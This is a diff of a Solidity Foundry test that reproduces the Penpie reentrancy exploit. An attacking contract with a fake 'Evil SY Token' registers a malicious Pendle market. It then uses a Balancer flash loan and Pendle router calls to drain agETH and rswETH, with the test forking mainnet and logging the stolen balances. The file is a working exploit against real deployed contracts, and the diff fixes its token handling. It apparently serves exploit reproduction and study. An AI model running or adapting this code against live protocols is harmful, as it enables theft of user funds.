@@ -19,6 +19,9 @@ import "../src/interfaces/penpie/MasterPenpie.sol";
 import "../src/interfaces/balancer/BalancerVault.sol";
 
 
+address constant agETH = 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e;
+address constant rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
+
 contract AttackingContract is Test {
     string public name = 'Evil SY Token'; // These params don't really matter
     string public symbol = 'EVIL';
@@ -44,24 +47,25 @@ contract AttackingContract is Test {
 
     function rewardIndexesCurrent() external returns (uint256[] memory) { }
 
-    function getRewardTokens() external view returns (address[] memory) {
-        if (0x5b6c23aedf704D19d6D8e921E638e8AE03cDCa82 == msg.sender) {
-            address[] memory tokens = new address[](2);
-            tokens[0] = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe;
-            tokens[1] = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6;
-            return tokens;
-        }
-    }
 
-    address agETH = 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e;
     address pendleAgEthSy = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe;
 
-    address rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
     address pendleRswEthSy = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6;
 
     address pendleRouterV4 = 0x888888888889758F76e7103c6CbF23ABbF58F946;
 
     address balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+
+    address LPT;
+
+    function getRewardTokens() external view returns (address[] memory) {
+        if (LPT == msg.sender) {
+            address[] memory tokens = new address[](2);
+            tokens[0] = pendleAgEthSy;
+            tokens[1] = pendleRswEthSy;
+            return tokens;
+        }
+    }
 
     uint256 claimRewardsCall;
     uint256 pendleAgEthSy_balance;
@@ -144,9 +148,7 @@ contract AttackingContract is Test {
         }
     }
 
-    address LPT;
-
-    function test_createEvilPendleMarket() external {
+    function createEvilPendleMarket() external {
         // Exploiter creates a Principal Token and a Yield Token on Pendle
         // using his evil Standard Yield token.
         (address PT, address YT) = PendleYieldContractFactory(0x35A338522a435D46f77Be32C70E215B813D0e3aC)
@@ -301,10 +303,10 @@ contract AttackingContract is Test {
             );
         }
 
-        PendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4).withdrawMarket(pendleAgEthSy, netLpOut_fromRouter);
+        PendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4).withdrawMarket(pendleRswEthSy, netLpOut_fromRouter);
 
-        pendleAgEthSy_balance = IERC20(pendleAgEthSy).balanceOf(address(this));
-        IERC20(pendleAgEthSy).approve(pendleRouterV4, pendleAgEthSy_balance);
+        uint256 _pendleRswEthSy_balance = IERC20(pendleRswEthSy).balanceOf(address(this));
+        IERC20(pendleRswEthSy).approve(pendleRouterV4, _pendleRswEthSy_balance);
 
         {
             PendleRouterV4.LimitOrderData memory limit = PendleRouterV4.LimitOrderData(
@@ -332,8 +334,8 @@ contract AttackingContract is Test {
 
             PendleRouterV4(pendleRouterV4).removeLiquiditySingleToken(
                 address(this),//address receiver,
-                pendleAgEthSy,//address market,
-                pendleAgEthSy_balance,//uint256 netLpToRemove,
+                pendleRswEthSy,//address market,
+                _pendleRswEthSy_balance,//uint256 netLpToRemove,
                 output,//TokenOutput calldata output,
                 limit//LimitOrderData calldata limit
             );
@@ -361,17 +363,22 @@ contract AttackingContract is Test {
             ''
         );
     }
+}
+
+contract CompleteAttack is Test {
+    AttackingContract attackingContract;
 
     function setUp() public {
         vm.createSelectFork("https://rpc.flashbots.net", 20671877);
-        this.test_createEvilPendleMarket();
-        vm.roll(block.number + 1);
     }
 
     function test_completePenpieAttack() public {
-        this.executeAttack();
+        attackingContract = new AttackingContract();
+        attackingContract.createEvilPendleMarket();
+        vm.roll(block.number + 1);
+        attackingContract.executeAttack();
 
-        console.log('Final balance in agETH :', IERC20(agETH).balanceOf(address(this)));
-        console.log('Final balance in rswETH:', IERC20(rswETH).balanceOf(address(this)));
+        console.log('Final balance in agETH :', IERC20(agETH).balanceOf(address(attackingContract)));
+        console.log('Final balance in rswETH:', IERC20(rswETH).balanceOf(address(attackingContract)));
     }
 }
